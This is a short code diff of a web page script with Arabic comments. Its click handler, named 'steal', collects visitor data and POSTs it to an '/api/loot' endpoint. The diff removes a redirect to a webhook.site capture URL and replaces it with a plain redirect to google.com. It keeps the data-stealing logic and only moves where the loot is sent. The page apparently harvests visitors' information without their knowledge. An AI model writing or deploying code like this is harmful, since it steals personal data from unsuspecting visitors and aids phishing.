@@ -10,15 +10,15 @@
       الوقت:new Date().toISOString()
     };
 
-    // إرسال إلى الـFunction
+    // إرسال إلى الـFunction المحلي فقط
     await fetch('/api/loot',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify(بيانات)
     });
 
-    // توجيه مؤقت إلى webhook.site مع إعادة التوجيه التلقائي بعد دقيقة
-    location.replace('https://webhook.site/c0f8a1f2-2582-4662-8c57-1fc73a68103e?redirect='+encodeURIComponent(location.origin));
+    // توجيه بسيط (يمكنك تغييره لاحقًا)
+    location.replace('https://www.google.com');
   };
   document.getElementById('enterBtn').addEventListener('click',سرق,{once:true});
 })();
